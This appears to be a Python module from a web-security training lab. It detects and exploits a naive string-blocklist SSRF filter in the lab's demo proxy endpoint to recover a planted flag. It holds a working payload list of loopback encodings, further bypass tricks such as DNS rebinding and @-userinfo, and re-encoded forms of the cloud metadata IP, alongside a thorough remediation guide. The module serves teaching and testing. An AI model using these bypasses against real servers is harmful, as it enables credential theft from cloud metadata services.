"""Advanced SSRF filter bypass -- defeating a blocklist-based loopback guard.

WHAT IT IS
----------
Ordinary SSRF (see :mod:`weblab.ssrf`) is "the server fetches a URL you choose".
The *advanced* variant is what happens when the developer *knows* about SSRF and
bolts on a filter -- but the filter is a **blocklist of literal strings** rather
than a real address check. The demo app's ``GET /proxy?url=`` sink is the textbook
shape::

    def _proxy(h):                                  # GET /proxy?url=<url>
        url = h._query().get("url", "")
        low = url.lower()
        if "127.0.0.1" in low or "localhost" in low:   # naive substring blocklist
            return h._send_json(403, {"error": "blocked: internal host denied"})
        host = urlparse(url).hostname or ""
        if _resolves_loopback(host):                   # the bypass reaches it
            return ...{"flag": C.FLAGS["advanced_ssrf"]}
        return h._send_json(403, {"error": "blocked: external host (lab jail)"})

The guard rejects the *spelling* ``127.0.0.1`` and the *name* ``localhost``, and
jails everything external. What it forgets is that ``127.0.0.1`` has *many other
spellings* that all resolve to the same loopback address. An IPv4 address is just a
32-bit integer; ``127.0.0.1`` is ``0x7f000001`` is ``2130706433`` decimal, and the
dotted form tolerates octal octets (``0177.0.0.1``) and shorthand where missing
octets are zero-filled (``127.1`` == ``127.0.0.1``). IPv6 has ``[::1]``. Each of
these is a perfectly valid host that the OS resolver -- and the server's own
``urlparse(...).hostname`` -> ``ipaddress`` check -- treats as loopback, yet none
of them contain the literal substring ``127.0.0.1`` or ``localhost``. The blocklist
sails right past them.

This is the real-world SSRF-filter-bypass class: alternate IP encodings (decimal /
hex / octal / shorthand / IPv6), and -- beyond what this lab models -- enclosed-alphanumerics
and full-width Unicode digits, ``[::ffff:127.0.0.1]`` IPv4-mapped IPv6, a trailing
dot, ``0.0.0.0`` as an all-interfaces alias, DNS names that resolve to 127.0.0.1
(``localtest.me``, ``*.nip.io``), the ``@``-userinfo trick
(``http://expected-host@127.1/``), and DNS-rebinding (a name that resolves public on
the first lookup and loopback on the second). In production the prize behind such a
filter is the cloud metadata service ``169.254.169.254`` (Capital One, 2019): an
attacker who can encode that IP past a naive ``"169.254"`` blocklist steals IAM
credentials. Here, for lab safety, the only reachable host is the app's own loopback
"admin-metadata" service, and the prize is ``C.FLAGS["advanced_ssrf"]``.

HOW WE DISCOVER IT
------------------
We confirm the bypass with three differential signals:

1. **The literal is blocked (control #1).** ``GET /proxy?url=http://127.0.0.1/``
   returns HTTP 403 ("internal host denied"). This proves a loopback *blocklist*
   exists -- the developer tried to stop SSRF.
2. **An external host is blocked (control #2).** ``http://example.com/`` returns
   HTTP 403 ("external host (lab jail)"). This proves the sink is not simply open;
   it refuses arbitrary destinations, so reaching loopback is a *bypass*, not the
   intended behaviour.
3. **An ENCODED loopback succeeds (the exploit signal).** ``http://2130706433/`` (and
   ``[::1]``, ``0177.0.0.1``, ``127.1``, ``0x7f000001``) return HTTP 200 carrying
   ``C.FLAGS["advanced_ssrf"]``. The same destination the blocklist forbade by its
   literal spelling is reachable by an equivalent spelling -- that differential *is*
   the vulnerability.

HOW WE EXPLOIT IT
-----------------
We feed the sink each loopback *encoding* in turn and keep the ones that return 200
with the flag. Every one of the brief's five forms bypasses the blocklist:
decimal (``2130706433``), IPv6 (``[::1]``), octal (``0177.0.0.1``), shorthand
(``127.1``), and hex (``0x7f000001``). We report exactly which encodings bypassed
and recover the flag from the first that worked. In the real world the identical
trick re-encodes ``169.254.169.254`` (e.g. ``0xa9fea9fe`` / ``2852039166``) to slip
past a metadata-IP blocklist and read cloud credentials.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never blocklist *spellings* -- parse the host,
RESOLVE it to its IP(s), and reject by IP *range* (loopback / link-local / private),
re-checking on every redirect and pinning the resolved IP to defeat rebinding.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Do NOT defend SSRF with a string blocklist of forbidden host spellings "
    "(\"127.0.0.1\", \"localhost\", \"169.254.169.254\"): an IPv4 address is a 32-bit "
    "integer with many equivalent encodings -- decimal (2130706433), hex (0x7f000001), "
    "octal (0177.0.0.1), dotted-shorthand (127.1 == 127.0.0.1), IPv6 ([::1], and the "
    "IPv4-mapped [::ffff:127.0.0.1]), a trailing dot, full-width/enclosed-alphanumeric "
    "Unicode digits, 0.0.0.0 as an all-interfaces alias, and DNS names that resolve to "
    "loopback (localtest.me, *.nip.io) -- so any substring/regex check is trivially "
    "bypassed. Instead: (1) parse the URL with a real parser and extract the host; "
    "(2) RESOLVE it to its IP address(es) and validate EACH resolved IP against deny "
    "RANGES, not strings -- reject loopback (127.0.0.0/8, ::1), link-local "
    "(169.254.0.0/16 and fe80::/10 -- the cloud metadata IP 169.254.169.254 that hands "
    "out IAM credentials, the Capital One breach vector), private (10/8, 172.16/12, "
    "192.168/16, fc00::/7), and other non-public ranges, using a normalising library "
    "(Python ipaddress, which collapses ALL the encodings above to one address); "
    "(3) prefer a strict ALLOW-LIST of exact destinations over any blocklist; "
    "(4) re-validate on EVERY redirect hop (an allowed host can 302 to 169.254.169.254) "
    "or disable redirects; (5) PIN the validated IP for the actual connection so a "
    "name cannot resolve benign-then-loopback (DNS rebinding); (6) restrict the scheme "
    "to http/https; and (7) as defence in depth, enforce an egress firewall / filtering "
    "forward proxy and IMDSv2 (token-required) so a missed code check still fails at "
    "the network. Resolve-and-validate-by-range, allow-list, pin, and contain -- never "
    "blocklist the spelling of an address."
)

#: The vulnerable SSRF-filter-bypass sink, used as the Finding endpoint.
ENDPOINT: str = "/proxy?url="

#: The literal loopback spelling the naive blocklist catches (control #1: 403).
BLOCKED_LITERAL_URL: str = "http://127.0.0.1/"

#: A second literal the blocklist catches -- the loopback *name* (also 403).
BLOCKED_NAME_URL: str = "http://localhost/"

#: An external host the sink jails (control #2: 403) -- proves the sink is not open,
#: so reaching loopback is a genuine bypass, not the intended behaviour.
EXTERNAL_URL: str = "http://example.com/"

#: The loopback ENCODINGS that bypass the substring blocklist. Each is an alternate,
#: equally-valid spelling of 127.0.0.1 (or ::1) that resolves to loopback yet contains
#: neither "127.0.0.1" nor "localhost", so the naive filter never sees it.
BYPASS_ENCODINGS: List[Tuple[str, str]] = [
    ("decimal", "http://2130706433/"),        # 127.0.0.1 as a 32-bit integer
    ("ipv6", "http://[::1]/"),                 # IPv6 loopback
    ("octal", "http://0177.0.0.1/"),           # leading-zero octal first octet
    ("dotted-shorthand", "http://127.1/"),     # 127.1 == 127.0.0.1 (zero-filled)
    ("hex", "http://0x7f000001/"),             # 0x7f000001 == 127.0.0.1
]

#: Every URL payload the engine feeds the sink (public so the CLI/report can show
#: exactly what was attempted): the two literals it expects blocked, the external
#: jail, and the five loopback encodings it expects to bypass.
PAYLOADS: List[str] = (
    [BLOCKED_LITERAL_URL, BLOCKED_NAME_URL, EXTERNAL_URL]
    + [url for _label, url in BYPASS_ENCODINGS]
)

#: Marker present in the sink's success JSON alongside the flag.
INTERNAL_MARKER: str = "admin-metadata"


# --- low-level probe ---------------------------------------------------------
def _proxy(client: WebClient, url: str) -> Response:
    """Drive the sink: ``GET /proxy?url=<url>`` (the server fetches ``url`` for us)."""
    return client.get("/proxy", params={"url": url})


def _is_flag_hit(resp: Response) -> bool:
    """True if the response is a 200 carrying the planted advanced-SSRF flag."""
    return resp.status == 200 and C.FLAGS["advanced_ssrf"] in resp.text


# --- detection (controls that prove a filter exists and is being bypassed) ---
def detect_literal_blocked(
    client: WebClient, url: str = BLOCKED_LITERAL_URL
) -> Tuple[bool, str]:
    """Control #1: the LITERAL loopback spelling is blocked (HTTP 403).

    ``GET /proxy?url=http://127.0.0.1/`` returns 403 ("internal host denied") --
    proof a loopback blocklist exists, so reaching loopback another way is a bypass.
    """
    resp = _proxy(client, url)
    if resp.status == 403 and C.FLAGS["advanced_ssrf"] not in resp.text:
        return True, (
            f"GET {ENDPOINT}{url} was blocked (HTTP {resp.status}) -- a naive "
            "substring blocklist rejects the literal loopback spelling, proving "
            "an (inadequate) SSRF filter is present"
        )
    return False, ""


def detect_external_blocked(
    client: WebClient, url: str = EXTERNAL_URL
) -> Tuple[bool, str]:
    """Control #2: an EXTERNAL host is jailed (HTTP 403).

    Proves the sink is not simply open to everything -- it refuses arbitrary
    destinations -- so reaching loopback via an encoding is a real bypass, not the
    sink's intended behaviour.
    """
    resp = _proxy(client, url)
    if resp.status == 403 and C.FLAGS["advanced_ssrf"] not in resp.text:
        return True, (
            f"GET {ENDPOINT}{url} was blocked (HTTP {resp.status}) -- the sink jails "
            "external hosts, so it is not open; reaching loopback is therefore a bypass"
        )
    return False, ""


def detect_encoding_bypass(client: WebClient) -> Tuple[bool, List[Tuple[str, str]], str]:
    """The exploit signal: at least one loopback ENCODING returns 200 + the flag.

    Tries every form in :data:`BYPASS_ENCODINGS`; returns ``(any_worked, working,
    evidence)`` where ``working`` is the list of ``(label, url)`` that bypassed. The
    same destination the blocklist forbade by spelling is reachable by an equivalent
    spelling -- that differential is the vulnerability.
    """
    working: List[Tuple[str, str]] = []
    for label, url in BYPASS_ENCODINGS:
        if _is_flag_hit(_proxy(client, url)):
            working.append((label, url))
    if working:
        forms = ", ".join(f"{label} ({url})" for label, url in working)
        evidence = (
            f"{len(working)}/{len(BYPASS_ENCODINGS)} loopback encodings bypassed the "
            f"blocklist with HTTP 200 + the flag: {forms} -- each resolves to 127.0.0.1 "
            "yet contains neither '127.0.0.1' nor 'localhost'"
        )
        return True, working, evidence
    return False, [], ""


# --- exploitation ------------------------------------------------------------
def exploit_bypass_filter(
    client: WebClient,
) -> Tuple[bool, Optional[str], List[Dict[str, str]], Dict[str, object]]:
    """Try every loopback encoding; recover the flag from the ones that bypass.

    Returns ``(ok, flag, attempts, leaked)`` where ``attempts`` records each encoding
    tried with its HTTP status and whether it bypassed (for the report), and ``leaked``
    is the success JSON from the first encoding that worked.
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    leaked: Dict[str, object] = {}
    for label, url in BYPASS_ENCODINGS:
        resp = _proxy(client, url)
        hit = _is_flag_hit(resp)
        attempts.append(
            {"encoding": label, "url": url, "status": str(resp.status),
             "bypassed": str(hit)}
        )
        if hit and flag is None:
            try:
                body = resp.json()
            except ValueError:
                body = {}
            candidate = body.get("flag") if isinstance(body, dict) else None
            if candidate == C.FLAGS["advanced_ssrf"]:
                flag = candidate
                leaked = body
    ok = flag == C.FLAGS["advanced_ssrf"]
    return ok, flag, attempts, leaked


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the SSRF filter bypass, then exploit it (recover the planted flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["advanced_ssrf"]`` and which encodings bypassed, with ``extra`` proving
    the bypass was real: the literal ``127.0.0.1`` is 403 and an external host is 403,
    yet an equivalent loopback encoding is 200.
    """
    techniques: List[str] = []

    # 1) Detection / controls ----------------------------------------------
    literal_ok, literal_ev = detect_literal_blocked(client)
    if literal_ok:
        techniques.append("literal-blocked-403")
    external_ok, external_ev = detect_external_blocked(client)
    if external_ok:
        techniques.append("external-blocked-403")
    bypass_ok, working, bypass_ev = detect_encoding_bypass(client)
    if bypass_ok:
        techniques.append("encoding-bypass-200")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, attempts, leaked = exploit_bypass_filter(client)
    if ok:
        techniques.append("recover-flag")

    # Discovery requires the bypass to have produced the flag AND the controls to
    # prove a filter was present and being bypassed (literal + external both 403).
    discovered = bool(bypass_ok and ok and literal_ok and external_ok)

    working_labels = [label for label, _url in working]

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if literal_ok:
        evidence_parts.append(f"literal-blocked: {literal_ev}")
    if external_ok:
        evidence_parts.append(f"external-blocked: {external_ev}")
    if bypass_ok:
        evidence_parts.append(f"encoding-bypass: {bypass_ev}")
    evidence = " || ".join(evidence_parts)

    first_working_url = working[0][1] if working else ""

    exploit_result = {
        "flag": flag,
        "payload": first_working_url,
        "bypass_encodings": working_labels,
        "working_payloads": [url for _label, url in working],
        "blocked_literal": BLOCKED_LITERAL_URL,
        "external_jailed": EXTERNAL_URL,
        "attempts": attempts,
        "leaked": leaked,
        "techniques": techniques,
        "summary": (
            f"the blocklist 403'd the literal {BLOCKED_LITERAL_URL} and jailed "
            f"{EXTERNAL_URL}, but {len(working)} loopback encoding(s) "
            f"({', '.join(working_labels)}) bypassed it with HTTP 200; recovered flag "
            f"{flag!r} via {first_working_url} -- the cloud analogue re-encodes "
            "169.254.169.254 to read IAM creds past a metadata-IP blocklist"
        ),
    }

    return Finding(
        vuln="Advanced SSRF Filter Bypass (loopback encodings)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=first_working_url,
        extra={
            "techniques": techniques,
            "literal_blocked": literal_ok,
            "literal_blocked_status": 403,
            "external_blocked": external_ok,
            "external_blocked_status": 403,
            "encoding_bypass": bypass_ok,
            "flag_recovered": ok,
            "bypass_encodings": working_labels,
            "working_payloads": [url for _label, url in working],
            "blocked_literal_url": BLOCKED_LITERAL_URL,
            "external_url": EXTERNAL_URL,
            "attempts": attempts,
            "cloud_metadata_ip": "169.254.169.254",
        },
    )
